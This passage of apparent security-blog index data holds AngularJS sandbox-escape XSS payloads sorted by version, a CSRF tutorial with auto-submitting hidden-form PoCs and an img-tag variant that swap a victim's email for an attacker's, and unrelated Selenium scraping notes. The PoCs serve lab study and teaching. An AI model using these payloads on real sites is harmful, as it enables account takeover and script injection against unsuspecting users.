1.2.23\n马蒂亚斯·卡尔松\n&#123;&#123;toString.constructor.prototype.toString=toString.constructor.prototype.call;[&quot;a&quot;,&quot;alert(1)&quot;].sort(toString.constructor);&#125;&#125;\n\n1.2.24 - 1.2.29\n加雷斯·海耶斯 （PortSwigger）\n&#123;&#123;&#x27;a&#x27;.constructor.prototype.charAt=&#x27;&#x27;.valueOf;$eval(&quot;x=&#x27;\\&quot;+(y=&#x27;if(!window\\\\u002ex)alert(window\\\\u002ex=1)&#x27;)+eval(y)+\\&quot;&#x27;&quot;);&#125;&#125;\n\n1.3.0\n加博尔·莫纳尔 （谷歌）\n&#123;&#123;!ready &amp;&amp; (ready = true) &amp;&amp; (      !call      ? $$watchers[0].get(toString.constructor.prototype)      : (a = apply) &amp;&amp;        (apply = constructor) &amp;&amp;        (valueOf = call) &amp;&amp;        (&#x27;&#x27;+&#x27;&#x27;.toString(          &#x27;F = Function.prototype;&#x27; +          &#x27;F.apply = F.a;&#x27; +          &#x27;delete F.a;&#x27; +          &#x27;delete F.valueOf;&#x27; +          &#x27;alert(1);&#x27;        ))    );&#125;&#125;\n\n1.3.1 - 1.3.2\n加雷斯·海耶斯 （PortSwigger）\n&#123;&#123;    &#123;&#125;[&#123;toString:[].join,length:1,0:&#x27;__proto__&#x27;&#125;].assign=[].join;    &#x27;a&#x27;.constructor.prototype.charAt=&#x27;&#x27;.valueOf;     $eval(&#x27;x=alert(1)//&#x27;); &#125;&#125;\n\n1.3.3 - 1.3.18\n加雷斯·海耶斯 （PortSwigger）\n&#123;&#123;&#123;&#125;[&#123;toString:[].join,length:1,0:&#x27;__proto__&#x27;&#125;].assign=[].join;   &#x27;a&#x27;.constructor.prototype.charAt=[].join;  $eval(&#x27;x=alert(1)//&#x27;);  &#125;&#125;\n\n1.3.19\n加雷斯·海耶斯 （PortSwigger）\n&#123;&#123;    &#x27;a&#x27;[&#123;toString:false,valueOf:[].join,length:1,0:&#x27;__proto__&#x27;&#125;].charAt=[].join;     $eval(&#x27;x=alert(1)//&#x27;); &#125;&#125;\n\n1.3.20\n加雷斯·海耶斯 （PortSwigger）\n&#123;&#123;&#x27;a&#x27;.constructor.prototype.charAt=[].join;$eval(&#x27;x=alert(1)&#x27;);&#125;&#125;\n\n1.4.0 - 1.4.9\n加雷斯·海耶斯 （PortSwigger）\n&#123;&#123;&#x27;a&#x27;.constructor.prototype.charAt=[].join;$eval(&#x27;x=1&#125; &#125; &#125;;alert(1)//&#x27;);&#125;&#125;\n\n1.5.0 - 1.5.8\n伊恩·希基\n&#123;&#123;x = &#123;&#x27;y&#x27;:&#x27;&#x27;.constructor.prototype&#125;; x[&#x27;y&#x27;].charAt=[].join;$eval(&#x27;x=alert(1)&#x27;);&#125;&#125; \n\n1.5.9 - 1.5.11\n扬·霍恩 （谷歌）\n&#123;&#123;   c=&#x27;&#x27;.sub.call;b=&#x27;&#x27;.sub.bind;a=&#x27;&#x27;.sub.apply;   c.$apply=$apply;c.$eval=b;op=$root.$$phase;   $root.$$phase=null;od=$root.$digest;$root.$digest=(&#123;&#125;).toString;   C=c.$apply(c);$root.$$phase=op;$root.$digest=od;   B=C(b,c,b);$evalAsync(&quot;   astNode=pop();astNode.type=&#x27;UnaryExpression&#x27;;   astNode.operator=&#x27;(window.X?void0:(window.X=true,alert(1)))+&#x27;;   astNode.argument=&#123;type:&#x27;Identifier&#x27;,name:&#x27;foo&#x27;&#125;;   &quot;);   m1=B($$asyncQueue.pop().expression,null,$root);   m2=B(C,null,m1);[].push.apply=m2;a=&#x27;&#x27;.sub;   $eval(&#x27;a(b.c)&#x27;);[].push.apply=a;&#125;&#125;\n\n&gt;=1.6.0\n马里奥·海德里希 (Cure53)\n&#123;&#123;constructor.constructor(&#x27;alert(1)&#x27;)()&#125;&#125;\n\n请访问网络学院 AngularJS 实验室以使用 AngularJS 来试验 XSS。\n","tags":["Web","XSS"]},{"title":"Web_CSRF","url":"/2022/08/26/CSRF/","content":"比较简单的洞，其实在CTFshow平台上，这部分题目直接放在xss了，当然这部分和XSS也非常相似，都是利用了HTML和JS\nCSRF是什么跨站请求伪造，允许攻击者诱导用户执行他们不愿意执行的操作。允许攻击者部分规避同源策略，该策略旨在防止不同网站之间相互干扰。\n简言之，冒充用户，做一些恶意请求，伪装用户进行恶意操作。\n\nCSRF攻击的影响在成功的CSRF攻击中，攻击者会导致受害者用户无意执行某项操作。例如，改受害用户的电子邮箱地址、改受害用户的头像、个性签名，甚至是可以修改他的密码进行资金转账。像CTFshow_XSS后边几个题就是如此。如果受害用户是admin，那么能进行的操作可能更多。\nCSRF如何工作CSRF要想存在，必须具备三个关键条件，所以说这种洞也是很少。\n１、网站中存在用户可登录的地方，如果就是个纯静态的网站，连用户登录点都没有，那一切都是空谈。\n２、执行该操作时涉及发出一个或者多个HTTP请求，并且网站仅依赖cookie来识别发出请求的用户。没有其他机制可用于追踪会话或验证用户请求。而且这个cookie必须要能利用到其他站点，因为我们要跨站，如果cookie不能跟走，那也是没什么用的，比如说httponly和SameSite都会阻碍我们的CSRF和XSS\n３、执行CSRF操作的请求不包含攻击者无法确定或猜测其值的任何参数。例如，当导致用户更改密码时，需要知道现有的密码，那么自然是无法实现。\n例如，假设一个网站包含一个允许用户更改自己账户上的电子邮箱地址的功能。用户执行此操作时候。会发出如下HTTP请求：\n\nPOST /email/change HTTP/1.1Host: vulnerable-website.comContent-Type: application/x-www-form-urlencodedContent-Length: 30Cookie: session=yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfE\nemail=&#99;&#x68;&#97;&#x72;&#109;&#x65;&#x72;&#x73;&#x69;&#120;&#x40;&#103;&#x6d;&#97;&#105;&#108;&#46;&#x63;&#111;&#x6d;\n\n这个例子就符合上述三个条件，\n\n 该网站存在登陆点，至少可以用Email登录\n 就这一个Cookie牵连着\n 没有其他因素影响攻击者\n\n那么就可以开始攻击他了，构建一个HTML网页，like this\n&lt;html&gt;    &lt;body&gt;        &lt;form action=&quot;https://vulnerable-website.com/email/change&quot; method=&quot;POST&quot;&gt;            &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;pwned@evil-user.net&quot; /&gt;        &lt;/form&gt;        &lt;script&gt;            document.forms[0].submit();        &lt;/script&gt;    &lt;/body&gt;&lt;/html&gt;\n\n那么你一定好奇，这些都要自己写吗，可不可以一键日卫星，当然可以。\n这个下面会结合靶场具体讲，这里只是举个小🌰而已\n那么这时候受害者访问攻击者的网页，他们在存在csrf漏洞的网站的邮箱就会改变成攻击者的邮箱\npwned@evil-user.net\n\n小tips\n尽管csrf通常被描述为与基于cookie的会话处理相关，但它也出现在应用程序自动将一些用户凭据添加到请求的其他上下文中，例如http基本身份验证和基于证书的身份验证。\n\n构建CSRF攻击从上边🌰中能看出，我们自己去手动写CSRF漏洞利用的HTML可能会比较麻烦，特别是所需的请求包含大量参数或请求中有其他麻烦的情况下。构建CSRF一键日🛰的方法就是使用burp suite内置的CSRF PoC 生成器\n这边我们来一个简单的靶场，主要是说一下bp的使用。\n靶场我们选用的是burp官网的靶场csrf第二题\n我们抓包改邮箱看一下，会发现这里边绑定了cookie和一个token也就是内个CSRF=\n然后我们看一下这个cookie有什么规律，再改一下\n\n经过测试，我们发现，把传输方式改成GET，token就没什么卵用了\n\n就可以生成一个poc\n在这个选项里可以勾选自动提交\n\n当然要自动提交了，再让受害者去点击提交，不是添麻烦嘛\n我们直接复制下来html\n&lt;html&gt;  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;  &lt;body&gt;  &lt;script&gt;history.pushState(&#x27;&#x27;, &#x27;&#x27;, &#x27;/&#x27;)&lt;/script&gt;    &lt;form action=&quot;https://0ae30021031005aac00448e6001b00b9.web-security-academy.net/my-account/change-email&quot;&gt;      &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;charmersix@gmail.com&quot; /&gt;      &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt;    &lt;/form&gt;    &lt;script&gt;      document.forms[0].submit();    &lt;/script&gt;  &lt;/body&gt;&lt;/html&gt;\n\n这里我们要把邮箱改成攻击者的邮箱\n我们来到这个exploit server，把这坨HTML复制到框里\n\n然后点击漏洞利用\n\nCSRF漏洞利用\nCSRF与XSS的原理基本相同。通常，攻击者会将恶意HTML放置到他们控制的网站上，然后诱导受害者访问该网站。这可以 通过电子邮件或社交媒体消息向用户提供网站链接来完成。或者如果攻击被放置在一个流行的网站中（例如，某用户评论区），他们就等着有用户访问恶意网站。\n请注意，一些简单的CSRF漏洞利用使用GET方式，并且可以在易受攻击的网站上使用单个URL完全自包含。这种情况下，攻击者可能不需要外部站点，并且可以直接向受害者提供易受攻击上的恶意URL．在前面的例子中，如果可以使用GET方法执行更改电子邮箱地址的请求，那么自包含攻击如下所示：\n&lt;img src=&quot;https://vulnerable-website.com/email/change?email=pwned@evil-user.net&quot;&gt;\n\n防止CSRF攻击防御CSRF攻击的最可靠方法是在相关请求中包含CSRF　ｔｏｋｅｎ。\n并且token要满足下面三个条件：\n\n 对于一般的token，值是不可预测的。\n session绑定到用户\n 执行相关操作之前，token一直能经过验证\n\n最常见的防御就是samesite　cookie\n常见的CSRF漏洞CSRF一般出现在邮箱修改，转账修改\n最有趣的CSRF漏洞由于token验证错误引起。\n在前面的示例中，假设application现在在更改用户电子邮箱的请求中包含一个CSRFtoken：\n\nPOST /email/change HTTP/1.1Host: vulnerable-website.comContent-Type: application/x-www-form-urlencodedContent-Length: 68Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm\ncsrf=WfF1szMUHhiokx9AHFply5L2xAOfjRkE&amp;email=&#x77;&#105;&#101;&#x6e;&#x65;&#114;&#64;&#x6e;&#111;&#114;&#109;&#x61;&#x6c;&#45;&#x75;&#115;&#101;&#114;&#x2e;&#x63;&#111;&#109;\n\n这种看起来可以防御CSRF攻击，因为它不具备CSRF存在的条件：网站不仅仅依赖于cookie进行会话处理，并且请求包含一个攻击者无法确定其值的参数。然而，有多种方法可以打破防御，所以还是有被CSRF攻击的可能。\n还有很多具体的情况，ｂｐ靶场里也是有的。\nCSRF还是很简单的，原理也比较好理解，具体绕过始终也离不开cookie，token，请求头之类的。\n","tags":["Web","CSRF"]},{"title":"Python_Selenium_Study","url":"/2023/03/08/Python_Selenium%E5%AD%A6%E4%B9%A0/","content":"在一切的开始,先感谢白月黑羽师傅\n这是师傅的blog:https://www.byhy.net/\n这是师傅的B站:https://space.bilibili.com/401981380\n推荐大家去看白月黑羽师傅的原文和视频这篇只是个人笔记\nselenium原理selenium自动化程序+浏览器驱动(转发指令)控制浏览器\n环境配置首先安装python, 这里不再赘述,然后安装selenium库\npip install selenium\n\n安装chrome浏览器及其驱动\n或者是可以选择edge浏览器及其驱动\n简单实例from selenium import webdriverfrom selenium.webdriver.chrome.service import Servicewd = webdriver.Chrome(service = Service(r&#x27;G:\\tools\\chromedriver\\chromedriver.exe&#x27;))# 创建 WebDriver 对象，指明使用chrome浏览器驱动wd.get(&#x27;https://charmersix.icu&#x27;)# 调用WebDriver 对象的get方法 可以让浏览器打开指定网址input()\n\n\n当然我们可以将chromedriver加一个环境变量,就可以不在代码里点明路径\nlike this\nfrom selenium import webdriver#from selenium.webdriver.chrome.service import Servicewd = webdriver.Chrome()#service = Service(r&#x27;G:\\tools\\chromedriver\\chromedriver.exe&#x27;))# 创建 WebDriver 对象，指明使用chrome浏览器驱动wd.get(&#x27;https://charmersix.icu&#x27;)# 调用WebDriver 对象的get方法 可以让浏览器打开指定网址input()\n\n选择元素的基本方法可以通过元素的id选择,但是这个id必须是当前页面唯一的,如果不确定是否是唯一的,可以通过搜索功能试一下\n\n可以看一下这里虽然搜出来了九个,实际上id=&quot;kw&quot;只有一个\n我们就可以通过实例实现一下\nfrom selenium import webdriverfrom selenium.webdriver.common.by import  By#from selenium.webdriver.chrome.service import Servicewd = webdriver.Chrome()#service = Service(r&#x27;G:\\tools\\chromedriver\\chromedriver.exe&#x27;))# 创建 WebDriver 对象，指明使用chrome浏览器驱动wd.get(&#x27;https://baidu.com&#x27;)# 调用WebDriver 对象的get方法 可以让浏览器打开指定网址element = wd.find_element(By.ID,&#x27;kw&#x27;)#根据id选择元素，返回的就是该元素对应的webelement对象element.send_keys(&#x27;Charmersix\\n&#x27;)#在输入框中输入字符串，并且回车搜索\n\n\nbing也是一样\n上边栗子采用的回车搜索,如果我们回车无法搜索需要点击的话,我们可以用click方法,还是通过id筛选搜索元素去点击这个元素\nfrom selenium import webdriverfrom selenium.webdriver.common.by import  By#from selenium.webdriver.chrome.service import Servicewd = webdriver.Chrome()#service = Service(r&#x27;G:\\tools\\chromedriver\\chromedriver.exe&#x27;))# 创建 WebDriver 对象，指明使用chrome浏览器驱动wd.get(&#x27;https://cn.bing.com/&#x27;)# 调用WebDriver 对象的get方法 可以让浏览器打开指定网址element = wd.find_element(By.ID,&#x27;sb_form_q&#x27;)#根据id选择元素，返回的就是该元素对应的webelement对象element.send_keys(&#x27;Charmersix&#x27;)#在输入框中输入字符串，并且回车搜索search = wd.find_element(By.ID,&#x27;search_icon&#x27;)search.click()\n\n\n如果我们想要筛选的这个元素、标签里没有id,我们也是可以根据其他方法来选择的,比方说class属性或者是标签名\n这里借用一下白月黑羽师傅的网站\nfrom selenium import webdriverfrom selenium.webdriver.common.by import  By#from selenium.webdriver.chrome.service import Servicewd = webdriver.Chrome()#service = Service(r&#x27;G:\\tools\\chromedriver\\chromedriver.exe&#x27;))# 创建 WebDriver 对象，指明使用chrome浏览器驱动wd.get(&#x27;https://cdn2.byhy.net/files/selenium/sample1.html&#x27;)# 调用WebDriver 对象的get方法 可以让浏览器打开指定网址elements = wd.find_elements(By.CLASS_NAME, &#x27;animal&#x27;)#这里换用了elements, 如果是element只能选择出第一个元素, 而elements可以将三个都选出来#根据class name选择元素，返回一个列表for element in elements:    print(element.text)#将筛选的内容打印出来\n\n\n根据标签名也是一样\nfrom selenium import webdriverfrom selenium.webdriver.common.by import  By#from selenium.webdriver.chrome.service import Servicewd = webdriver.Chrome()#service = Service(r&#x27;G:\\tools\\chromedriver\\chromedriver.exe&#x27;))# 创建 WebDriver 对象，指明使用chrome浏览器驱动wd.get(&#x27;https://cdn2.byhy.net/files/selenium/sample1.html&#x27;)# 调用WebDriver 对象的get方法 可以让浏览器打开指定网址elements = wd.find_elements(By.TAG_NAME, &#x27;span&#x27;)#根据标签选择元素，返回一个列表for element in elements:    print(element.text)#将筛选的内容打印出来\n\n\nWebDriver对象选择元素的范围是整个web页面，而WebElement对象选择的范围是元素内部，简而言之就是我们可以通过套娃方法选择到更具体的、更精确的信息\nfrom selenium import webdriverfrom selenium.webdriver.common.by import  By#from selenium.webdriver.chrome.service import Servicewd = webdriver.Chrome()#service = Service(r&#x27;G:\\tools\\chromedriver\\chromedriver.exe&#x27;))# 创建 WebDriver 对象，指明使用chrome浏览器驱动wd.get(&#x27;https://cdn2.byhy.net/files/selenium/sample1.html&#x27;)# 调用WebDriver 对象的get方法 可以让浏览器打开指定网址elements = wd.find_element(By.ID, &#x27;container&#x27;)#通过id选择特定元素spans = elements.find_elements(By.TAG_NAME, &#x27;span&#x27;)#根据标签选择元素，返回一个列表for span in spans:    print(span.text)#将筛选的内容打印出来\n\n\n等待元素出现这个模块主要是用于搜索功能后再查找提取内容利用sleep\n例如,我这里要提取出我从bing中搜出的关于Charmersix的网站\nimport timefrom selenium import webdriverfrom selenium.webdriver.common.by import  By#from selenium.webdriver.chrome.service import Servicewd = webdriver.Chrome()#service = Service(r&#x27;G:\\tools\\chromedriver\\chromedriver.exe&#x27;))# 创建 WebDriver 对象，指明使用chrome浏览器驱动wd.get(&#x27;https://cn.bing.com/&#x27;)# 调用WebDriver 对象的get方法 可以让浏览器打开指定网址elements = wd.find_element(By.ID, &#x27;sb_form_q&#x27;)#通过id选择特定元素elements.send_keys(&#x27;Charmersix&#x27;)search = wd.find_element(By.ID, &#x27;search_icon&#x27;)search.click()time.sleep(5)#给网站一个反应的时间，然后继续提取想要的内容cites = wd.find_elements(By.TAG_NAME, &#x27;cite&#x27;)#根据标签选择元素，返回一个列表for cite in cites:    print(cite.text)#将筛选的内容打印出来\n\n\n这里的sleep(5)比较长, 那么我们怎么确定具体的时间是多少, 睡多长时间最有效率呢, 我们可以使用selenium给我们提供的隐式等待也就是implicitly_wait()其原理是:当发现元素没有找到的时候,并不立即返回找不到的报错, 而是每隔半秒钟重新寻找, 在规定时间内直到找到该元素, 如果超出规定时间才会抛异常, ()填的数字就是我们所规定的最大等待时间.也可以用一串代码来解释这个implicitly_wait()\nwhile True:    try:        cites = wd.find_elements(By.TAG_NAME, &#x27;cite&#x27;)        for cite in cites:            print(cite.text)        break    except:        time.sleep(0.5)\n\n\n再来使用implicitly_wait()也可以达到同样的效果,但是代码会简化很多,这也就是python的强大之处\nfrom selenium import webdriverfrom selenium.webdriver.common.by import  By#from selenium.webdriver.chrome.service import Servicewd = webdriver.Chrome()#service = Service(r&#x27;G:\\tools\\chromedriver\\chromedriver.exe&#x27;))# 创建 WebDriver 对象，指明使用chrome浏览器驱动wd.get(&#x27;https://cn.bing.com/&#x27;)# 调用WebDriver 对象的get方法 可以让浏览器打开指定网址elements = wd.find_element(By.ID, &#x27;sb_form_q&#x27;)#通过id选择特定元素elements.send_keys(&#x27;Charmersix&#x27;)search = wd.find_element(By.ID, &#x27;search_icon&#x27;)search.click()wd.implicitly_wait(5)cites = wd.find_elements(By.TAG_NAME, &#x27;cite&#x27;)for cite in cites:    print(cite.text)\n\n\n操控元素点击元素点击元素前面已经讲过就是调用webelement对象的click方法\n这里要补充的是, 当我们调用webelement对象的click方法去点击的元素的时候, 浏览器接收到自动化命令, 点击的是该元素的中心点位置\n但是当一些按钮的有效点击区域不在中间的时候, 我们就需要重新定位到有效点击区域\n输入框前面也已经学过就是调用send_keys方法, 但是如果我们输入框中已经有内容了, 就需要先用一个clear方法, 将输入框中的内容清楚掉\n我们试一下在原来的代码里加入两行\nelements.clear()elements.send_keys(&#x27;SkyMirror&#x27;)\n\n我们会发现, 搜索框里的内容不再是Charmersix而是现在的SkyMirror\n获取元素信息获取元素属性有一些关键信息可能不是文本形式, 有可能藏在元素的属性里, 比如说一些搜索框的提示语我们就可以使用get_attribute\nfrom selenium import webdriverfrom selenium.webdriver.common.by import Bywd = webdriver.Chrome()wd.get(&#x27;https://charmersix.icu/search/&#x27;)elements = wd.find_element(By.TAG_NAME,&#x27;input&#x27;)text = elements.get_attribute(&#x27;placeholder&#x27;)print(text)\n\n像这样\n获取整个元素对应的HTML假如我们要提取大段的HTML内容, 我们可以使用elements.get_attribute(&#39;innerHTML&#39;)获取整个元素的HTML内容和elements.get_attribute(&#39;outerHTML&#39;)获取某元素内部的HTML内容\n获取输入框里的文字对于输入框里的文本内容，用text属性是不行的，这时候可以使用get_attribute(&#39;value&#39;)\n比方说, 我们在上边代码里加入一行\nprint(elements.get_attribute(&#x27;value&#x27;))\n\n\n我们就能发现这里可以获取到我们输入的Charmersix内容\n获取元素文本内容通过webelement对象的text属性, 可以获取元素展示在界面上的文本内容, 但是有时候元素的文本内容没有显示在界面上或者没有完全展示在界面上. 这时候用text属性可能没办法正常获取文本内容, 出现这种问题尝试使用element.get_attribute(&#39;innerText&#39;)或者element.get_attribute(&#39;textContent&#39;)\n使用 innerText 和 textContent 的区别是，前者只显示元素可见文本内容，后者显示所有内容（包括display属性为none的部分）\n\n如果您了解web前端开发，可以知晓一下：\nget_attribute 调用本质上就是调用 HTMLElement 对像的属性\n比如\nelement.get_attribute(‘value’) 等价于js里面的 element.value\nelement.get_attribute(‘innerText’) 等价于js里面的 element.innerText\n\ncss表达式CSS 选择器在 CSS 中，选择器是选取需设置样式的元素的模式。\n请使用我们的 CSS 选择器测试工具，它可为您演示不同的选择器。\n\n\n\n选择器\n例子\n例子描述\n\n\n\n.class\n.intro\n选择 class=”intro” 的所有元素。\n\n\n.class1.class2\n.name1.name2\n选择 class 属性中同时有 name1 和 name2 的所有元素。\n\n\n.class1 .class2\n.name1 .name2\n选择作为类名 name1 元素后代的所有类名 name2 元素。\n\n\n#id\n#firstname\n选择 id=”firstname” 的元素。\n\n\n*\n*\n选择所有元素。\n\n\nelement\np\n选择所有 &lt;p&gt; 元素。\n\n\nelement.class\np.intro\n选择 class=”intro” 的所有 &lt;p&gt; 元素。\n\n\nelement,element\ndiv, p\n选择所有 &lt;div&gt; 元素和所有 &lt;p&gt; 元素。\n\n\nelement element\ndiv p\n选择 &lt;div&gt; 元素内的所有 &lt;p&gt; 元素。\n\n\nelement&gt;element\ndiv &gt; p\n选择父元素是 &lt;div&gt; 的所有 &lt;p&gt; 元素。\n\n\nelement+element\ndiv + p\n选择紧跟 &lt;div&gt; 元素的首个 &lt;p&gt; 元素。\n\n\nelement1~element2\np ~ ul\n选择前面有 &lt;p&gt; 元素的每个 &lt;ul&gt; 元素。\n\n\n[attribute]\n[target]\n选择带有 target 属性的所有元素。\n\n\n[attribute=value]\n[target=_blank]\n选择带有 target=”_blank” 属性的所有元素。\n\n\n[attribute~=value]\n[title~=flower]\n选择 title 属性包含单词 “flower” 的所有元素。\n\n\n[attribute|=value]\n[lang|=en]\n选择 lang 属性值以 “en” 开头的所有元素。\n\n\n[attribute^=value]\na[href^=”https”]\n选择其 src 属性值以 “https” 开头的每个 &lt;a&gt; 元素。\n\n\n[attribute$=value]\na[href$=”.pdf”]\n选择其 src 属性以 “.pdf” 结尾的所有 &lt;a&gt; 元素。\n\n\n[attribute*=value]\na[href*=”w3schools”]\n选择其 href 属性值中包含 “abc” 子串的每个 &lt;a&gt; 元素。\n\n\n:active\na:active\n选择活动链接。\n\n\n::after\np::after\n在每个 &lt;p&gt; 的内容之后插入内容。\n\n\n::before\np::before\n在每个 &lt;p&gt; 的内容之前插入内容。\n\n\n:checked\ninput:checked\n选择每个被选中的 &lt;input&gt; 元素。\n\n\n:default\ninput:default\n选择默认的 &lt;input&gt; 元素。\n\n\n:disabled\ninput:disabled\n选择每个被禁用的 &lt;input&gt; 元素。\n\n\n:empty\np:empty\n选择没有子元素的每个 &lt;p&gt; 元素（包括文本节点）。\n\n\n:enabled\ninput:enabled\n选择每个启用的 &lt;input&gt; 元素。\n\n\n:first-child\np:first-child\n选择属于父元素的第一个子元素的每个 &lt;p&gt; 元素。\n\n\n::first-letter\np::first-letter\n选择每个 &lt;p&gt; 元素的首字母。\n\n\n::first-line\np::first-line\n选择每个 &lt;p&gt; 元素的首行。\n\n\n:first-of-type\np:first-of-type\n选择属于其父元素的首个 &lt;p&gt; 元素的每个 &lt;p&gt; 元素。\n\n\n:focus\ninput:focus\n选择获得焦点的 input 元素。\n\n\n:fullscreen\n:fullscreen\n选择处于全屏模式的元素。\n\n\n:hover\na:hover\n选择鼠标指针位于其上的链接。\n\n\n:in-range\ninput:in-range\n选择其值在指定范围内的 input 元素。\n\n\n:indeterminate\ninput:indeterminate\n选择处于不确定状态的 input 元素。\n\n\n:invalid\ninput:invalid\n选择具有无效值的所有 input 元素。\n\n\n:lang(language)\np:lang(it)\n选择 lang 属性等于 “it”（意大利）的每个 &lt;p&gt; 元素。\n\n\n:last-child\np:last-child\n选择属于其父元素最后一个子元素每个 &lt;p&gt; 元素。\n\n\n:last-of-type\np:last-of-type\n选择属于其父元素的最后 &lt;p&gt; 元素的每个 &lt;p&gt; 元素。\n\n\n:link\na:link\n选择所有未访问过的链接。\n\n\n:not(selector)\n:not(p)\n选择非 &lt;p&gt; 元素的每个元素。\n\n\n:nth-child(n)\np:nth-child(2)\n选择属于其父元素的第二个子元素的每个 &lt;p&gt; 元素。\n\n\n:nth-last-child(n)\np:nth-last-child(2)\n同上，从最后一个子元素开始计数。\n\n\n:nth-of-type(n)\np:nth-of-type(2)\n选择属于其父元素第二个 &lt;p&gt; 元素的每个 &lt;p&gt; 元素。\n\n\n:nth-last-of-type(n)\np:nth-last-of-type(2)\n同上，但是从最后一个子元素开始计数。\n\n\n:only-of-type\np:only-of-type\n选择属于其父元素唯一的 &lt;p&gt; 元素的每个 &lt;p&gt; 元素。\n\n\n:only-child\np:only-child\n选择属于其父元素的唯一子元素的每个 &lt;p&gt; 元素。\n\n\n:optional\ninput:optional\n选择不带 “required” 属性的 input 元素。\n\n\n:out-of-range\ninput:out-of-range\n选择值超出指定范围的 input 元素。\n\n\n::placeholder\ninput::placeholder\n选择已规定 “placeholder” 属性的 input 元素。\n\n\n:read-only\ninput:read-only\n选择已规定 “readonly” 属性的 input 元素。\n\n\n:read-write\ninput:read-write\n选择未规定 “readonly” 属性的 input 元素。\n\n\n:required\ninput:required\n选择已规定 “required” 属性的 input 元素。\n\n\n:root\n:root\n选择文档的根元素。\n\n\n::selection\n::selection\n选择用户已选取的元素部分。\n\n\n:target\n#news:target\n选择当前活动的 #news 元素。\n\n\n:valid\ninput:valid\n选择带有有效值的所有 input 元素。\n\n\n:visited\na:visited\n选择所有已访问的链接。\n\n\nCSS_SELECTORHTML中经常要为某些元素指定显示效果，比如 前景文字颜色是红色， 背景颜色是黑色， 字体是微软雅黑等。\n那么CSS必须告诉浏览器：要 选择哪些元素 ， 来使用这样的显示风格。例如这个白月黑羽的测试页\n我们就可以使用By.CSS_SELECTOR来筛选元素\nfrom selenium import webdriverfrom selenium.webdriver.common.by import Bywd = webdriver.Chrome()wd.get(&#x27;https://cdn2.byhy.net/files/selenium/sample1.html&#x27;)elements = wd.find_elements(By.CSS_SELECTOR, &#x27;.animal&#x27;)for i in elements:    print(i.get_attribute(&#x27;outerHTML&#x27;))\n\n\nBy.CSS_SELECTOR同样可以根据tag名、id 属性和 class属性 来 选择元素，\n根据 tag名 选择元素的 CSS Selector 语法非常简单，直接写上tag名即可，\n根据id属性 选择元素的语法是在id号前面加上一个井号： #id值\n根据class属性 选择元素的语法是在 class 值 前面加上一个点： .class值\n比如:\nfrom selenium import webdriverfrom selenium.webdriver.common.by import  By#from selenium.webdriver.chrome.service import Servicewd = webdriver.Chrome()#service = Service(r&#x27;G:\\tools\\chromedriver\\chromedriver.exe&#x27;))# 创建 WebDriver 对象，指明使用chrome浏览器驱动wd.get(&#x27;https://cn.bing.com/&#x27;)# 调用WebDriver 对象的get方法 可以让浏览器打开指定网址elements = wd.find_element(By.CSS_SELECTOR, &#x27;#sb_form_q&#x27;)#通过id选择特定元素elements.send_keys(&#x27;Charmersix&#x27;)search = wd.find_element(By.CSS_SELECTOR, &#x27;#search_icon&#x27;)# print(elements.get_attribute(&#x27;value&#x27;))# elements.clear()# elements.send_keys(&#x27;SkyMirror&#x27;)search.click()wd.implicitly_wait(5)clas = wd.find_element(By.CSS_SELECTOR, &#x27;.b_attribution&#x27;)#clas = wd.find_element(By.CLASS_NAME, &#x27;.b_attribution&#x27;)cites = wd.find_elements(By.CSS_SELECTOR, &#x27;cite&#x27;)for cite in cites:    print(cite.text)\n\n\n选择子元素和后代元素HTML中, 元素内部可以包含元素其他元素, CSS_SELECTOR我们可以通过使用&gt;来选择某个元素的子元素, 或者通过使用 空格来选择某元素的后代元素\n比如说\n元素1&gt;元素2&gt;元素3\n\n就可以更加精准的选择到元素三\n当然我们也可以使用\n元素1 元素3\n\n也是可以选择到元素3的\n比如说, 这里我们想精准定位到我的这个博客地址\nfrom selenium import webdriverfrom selenium.webdriver.common.by import  By#from selenium.webdriver.chrome.service import Servicewd = webdriver.Chrome()#service = Service(r&#x27;G:\\tools\\chromedriver\\chromedriver.exe&#x27;))# 创建 WebDriver 对象，指明使用chrome浏览器驱动wd.get(&#x27;https://cn.bing.com/&#x27;)# 调用WebDriver 对象的get方法 可以让浏览器打开指定网址elements = wd.find_element(By.CSS_SELECTOR, &#x27;#sb_form_q&#x27;)#通过id选择特定元素elements.send_keys(&#x27;Charmersix&#x27;)search = wd.find_element(By.CSS_SELECTOR, &#x27;#search_icon&#x27;)# print(elements.get_attribute(&#x27;value&#x27;))# elements.clear()# elements.send_keys(&#x27;SkyMirror&#x27;)search.click()wd.implicitly_wait(5)#clas = wd.find_element(By.CLASS_NAME, &#x27;.b_attribution&#x27;)cites = wd.find_element(By.CSS_SELECTOR, &#x27;.b_caption&gt;.b_snippet cite&#x27;)print(cites.text)# for cite in cites:#     print(cite.text)\n\n\n根据属性选择像我们这些id, class都是比较常见的, 所以selenium提供了固定的筛选方法, 但是网页中的属性其实是多种多样的, selenium不可能全部规定好, 所以, CSS_SELECTOR提供了可以自定义属性的方法, 就是用[属性名字=属性值]\n比如还是上面的例子, 我们会发现, 这个网页里的u属性是比较唯一的\n但是, 我们在测试的过程中又会发现u的值会变化, 但是我们会发现一个规律, u的前几位是一样的, 这时候我们就可以使用我们的正则表达式\n比方说[u^=&quot;1|5090|&quot;]表示属性值以1|5090|开头的, [u*=&quot;1|5090|&quot;]表示属性中含有1|5090|的, [u$=&quot;1|5090|&quot;]表示以1|5090|结尾的\n如果一个元素具有多个属性, 我们可以直接并列这两个属性, 用来选择, 像这样&#39;[u^=&quot;1|5090|&quot;][tabindex=&quot;0&quot;]&#39;\n我们就可以把代码修改为这样, 达到筛选出我博客地址的效果\ncites = wd.find_element(By.CSS_SELECTOR, &#x27;[u^=&quot;1|5090|&quot;][tabindex=&quot;0&quot;]&gt;cite&#x27;)\n\n\n验证选择语法众所周知, python+selenium运行速度是非常慢的, 如果我们程序每次都通过debug调试的话, 效率太低. 但是我们的浏览器F12的开发者工具也是支持我们的CSS_SELECTOR语法的like this\n这里我们故意写错试一下\n这里就会显示0, 那么我们就很容易发现, 语法不可行\n选择语法组合使用上面已经提到过, 我们需要同时用多个条件限制的时候, 直接两个条件贴在一起, 像上边已经提到过的\n\n如果我们想要同时获得两个不相干的内容, 我们可以使用,来隔开两个条件, 比如说, 